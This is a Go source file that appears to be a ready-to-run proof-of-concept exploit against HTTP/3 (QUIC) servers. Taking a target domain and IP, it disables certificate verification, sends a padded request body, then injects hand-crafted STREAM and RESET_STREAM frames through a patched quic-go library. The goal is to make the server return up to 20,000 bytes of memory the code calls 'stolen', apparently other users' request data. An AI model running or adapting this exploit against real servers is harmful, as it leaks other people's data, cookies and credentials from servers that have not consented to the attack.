package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"time"

	"github.com/marten-seemann/qpack"
	quic "github.com/neex/hui2ochko/patched-quic-go"
	"github.com/neex/hui2ochko/patched-quic-go/internal_/protocol"
	"github.com/neex/hui2ochko/patched-quic-go/internal_/wire"

	"golang.org/x/net/context"
)

type Header struct{ Name, Value string }
type Headers []Header

type HTTPMessage struct {
	Headers Headers
	Body    []byte
}

func main() {
	args := os.Args[1:]
	if len(args) != 2 {
		log.Fatalf("usage: %v <domain> <ip>", os.Args[0])
	}
	targetAddr := args[1]
	if _, _, err := net.SplitHostPort(targetAddr); err != nil {
		targetAddr = net.JoinHostPort(targetAddr, "443")
	}
	serverName := args[0]

	prefix := []byte("")
	suffix := []byte("")
	stealBytes := 20000

	req := &HTTPMessage{
		Headers: []Header{
			{":method", "POST"},
			{":path", "/"},
			{":authority", serverName},
			{":scheme", "https"},
			{"user-agent", "Mozilla/5.0"},
		},
		Body: nil,
	}

	resp, err := attack(targetAddr, serverName, req, prefix, suffix, stealBytes)
	if err != nil {
		log.Fatalf("Error: %#v", err)
	}

	for _, h := range resp.Headers {
		fmt.Printf("%v: %v\n", h.Name, h.Value)
	}
	fmt.Println()
	fmt.Printf("%s\n", resp.Body)
}

func attack(connectAddr, serverName string, request *HTTPMessage, prefix, suffix []byte, stealBytes int) (response *HTTPMessage, err error) {
	flushSize := 1024 * 10

	if len(prefix) >= flushSize {
		return nil, fmt.Errorf("len(prefix) > %v", flushSize)
	}
	if len(suffix) > 1000 {
		return nil, fmt.Errorf("len(suffix) > 1000")
	}

	address := connectAddr
	if _, _, err := net.SplitHostPort(connectAddr); err != nil {
		address = net.JoinHostPort(address, "443")
	}

	name, port, err := net.SplitHostPort(address)
	if err != nil {
		return nil, fmt.Errorf("invalid address %v: %w", address, err)
	}

	ip, err := net.LookupIP(name)
	if err != nil {
		return nil, fmt.Errorf("lookup for %v failed: %w", name, err)
	}
	portInt, err := strconv.Atoi(port)
	if err != nil {
		return nil, fmt.Errorf("invalid port: %w", err)
	}

	udpConn, err := net.ListenPacket("udp", ":0")
	if err != nil {
		return nil, err
	}
	defer func() { _ = udpConn.Close() }()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	go func() {
		<-ctx.Done()
		_ = udpConn.Close()
	}()

	udpAddr := &net.UDPAddr{
		IP:   ip[0],
		Port: portInt,
	}

	session, err := quic.DialEarlyContext(ctx, udpConn, udpAddr, serverName,
		&tls.Config{
			NextProtos:         []string{"h3", "h3-29"},
			ServerName:         serverName,
			InsecureSkipVerify: true,
		},
		&quic.Config{
			Versions:           []quic.VersionNumber{quic.Version1, quic.VersionDraft29},
			MaxIncomingStreams: -1,
			KeepAlive:          true,
		})

	if err != nil {
		return nil, err
	}

	defer func() { _ = session.CloseWithError(0, "") }()

	if err := setupSession(session); err != nil {
		return nil, err
	}

	requestStream, err := session.OpenStream()
	if err != nil {
		return nil, err
	}

	firstRange := bytes.NewBuffer(nil)
	requestHeaders := request.Headers
	requestHeaders = append(requestHeaders, Header{
		Name:  "content-length",
		Value: strconv.Itoa(flushSize + stealBytes + len(suffix) + 1),
	})
	firstRange.Write(encodeHeaders(requestHeaders))
	firstRange.Write(encodeBodyHeader(flushSize))
	firstRange.Write(prefix)
	firstRange.Write(bytes.Repeat([]byte("A"), flushSize-len(prefix)-1))

	stolenBytesWithSuffix := stealBytes + len(suffix) + 1
	flushFrameContent := append([]byte("L"), encodeBodyHeader(stolenBytesWithSuffix)...)
	finFrameContent := append([]byte("S"), suffix...)

	flushByteOffset := firstRange.Len()
	firstStolenByteOffset := flushByteOffset + len(flushFrameContent)
	finFrameOffset := firstStolenByteOffset + stealBytes
	totalSize := finFrameOffset + len(finFrameContent)

	flushFrame := &wire.StreamFrame{
		StreamID:       0,
		Offset:         protocol.ByteCount(flushByteOffset),
		Data:           flushFrameContent,
		Fin:            false,
		DataLenPresent: true,
	}

	finFrame := &wire.StreamFrame{
		StreamID:       0,
		Offset:         protocol.ByteCount(finFrameOffset),
		Data:           finFrameContent,
		Fin:            true,
		DataLenPresent: true,
	}

	resetFrame := &wire.ResetStreamFrame{
		StreamID:  0,
		ErrorCode: 0,
		FinalSize: protocol.ByteCount(totalSize),
	}

	frames := []wire.Frame{
		flushFrame,
		finFrame,
		resetFrame,
	}

	_, _ = requestStream.Write(firstRange.Bytes())
	log.Printf("frames with headers and prefix sent")
	time.Sleep(2 * time.Second)
	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(frames)

	var (
		headers Headers
		body    []byte
	)

	decoder := qpack.NewDecoder(func(f qpack.HeaderField) {
		headers = append(headers, Header{
			Name:  f.Name,
			Value: f.Value,
		})
	})
	frameBuffer := bufio.NewReader(requestStream)
	for {
		frame, err := readFrame(frameBuffer)
		if err != nil {
			if ctx.Err() != nil {
				return nil, fmt.Errorf("timeout error")
			}

			if err == io.EOF {
				break
			}

			if qErr, ok := err.(interface{ IsApplicationError() bool }); ok {
				if qErr.IsApplicationError() {
					return nil, fmt.Errorf("connection dropped: %v", qErr)
				}
			}
			return nil, err
		}
		switch frame.Type {
		case 0x0:
			body = append(body, frame.Data...)
		case 0x1:
			if _, err := decoder.Write(frame.Data); err != nil {
				return nil, err
			}
		default:
			// ignore unknown frame types for now
		}
	}

	return &HTTPMessage{
		Headers: headers,
		Body:    body,
	}, nil
}

type http3Frame struct {
	Type int
	Len  uint64
	Data []byte
}

func readFrame(b *bufio.Reader) (*http3Frame, error) {
	t, err := readVarInt(b)
	if err != nil {
		return nil, err
	}
	l, err := readVarInt(b)
	if err != nil {
		return nil, err
	}
	data := make([]byte, l)
	if _, err := io.ReadFull(b, data); err != nil {
		return nil, err
	}
	return &http3Frame{
		Type: int(t),
		Len:  l,
		Data: data,
	}, nil
}

func encodeHeaders(headers Headers) []byte {
	qpackBuf := bytes.NewBuffer(nil)
	e := qpack.NewEncoder(qpackBuf)
	for _, h := range headers {
		_ = e.WriteField(qpack.HeaderField{Name: h.Name, Value: h.Value})
	}
	headersFrame := bytes.NewBuffer(nil)
	writeVarInt(headersFrame, 0x1)
	writeVarInt(headersFrame, uint64(qpackBuf.Len()))
	headersFrame.Write(qpackBuf.Bytes())
	return headersFrame.Bytes()
}

func encodeBodyHeader(size int) (frame []byte) {
	buf := bytes.NewBuffer(nil)
	writeVarInt(buf, 0x00)
	writeVarInt(buf, uint64(size))
	return buf.Bytes()
}

func setupSession(session quic.Session) error {
	str, err := session.OpenUniStream()
	if err != nil {
		return err
	}
	buf := &bytes.Buffer{}
	buf.Write([]byte{0x0, 0x4, 0x0}) // TODO: this is shit
	if _, err := str.Write(buf.Bytes()); err != nil {
		return err
	}
	return nil
}

const (
	maxVarInt1 = 63
	maxVarInt2 = 16383
	maxVarInt4 = 1073741823
	maxVarInt8 = 4611686018427387903
)

func readVarInt(b io.ByteReader) (uint64, error) {
	firstByte, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	// the first two bits of the first byte encode the length
	intLen := 1 << ((firstByte & 0xc0) >> 6)
	b1 := firstByte & (0xff - 0xc0)
	if intLen == 1 {
		return uint64(b1), nil
	}
	b2, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	if intLen == 2 {
		return uint64(b2) + uint64(b1)<<8, nil
	}
	b3, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	b4, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	if intLen == 4 {
		return uint64(b4) + uint64(b3)<<8 + uint64(b2)<<16 + uint64(b1)<<24, nil
	}
	b5, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	b6, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	b7, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	b8, err := b.ReadByte()
	if err != nil {
		return 0, err
	}
	return uint64(b8) + uint64(b7)<<8 + uint64(b6)<<16 + uint64(b5)<<24 + uint64(b4)<<32 + uint64(b3)<<40 + uint64(b2)<<48 + uint64(b1)<<56, nil
}

func writeVarInt(b *bytes.Buffer, i uint64) {
	if i <= maxVarInt1 {
		b.WriteByte(uint8(i))
	} else if i <= maxVarInt2 {
		b.Write([]byte{uint8(i>>8) | 0x40, uint8(i)})
	} else if i <= maxVarInt4 {
		b.Write([]byte{uint8(i>>24) | 0x80, uint8(i >> 16), uint8(i >> 8), uint8(i)})
	} else if i <= maxVarInt8 {
		b.Write([]byte{
			uint8(i>>56) | 0xc0, uint8(i >> 48), uint8(i >> 40), uint8(i >> 32),
			uint8(i >> 24), uint8(i >> 16), uint8(i >> 8), uint8(i),
		})
	} else {
		panic(fmt.Sprintf("%#x doesn't fit into 62 bits", i))
	}
}
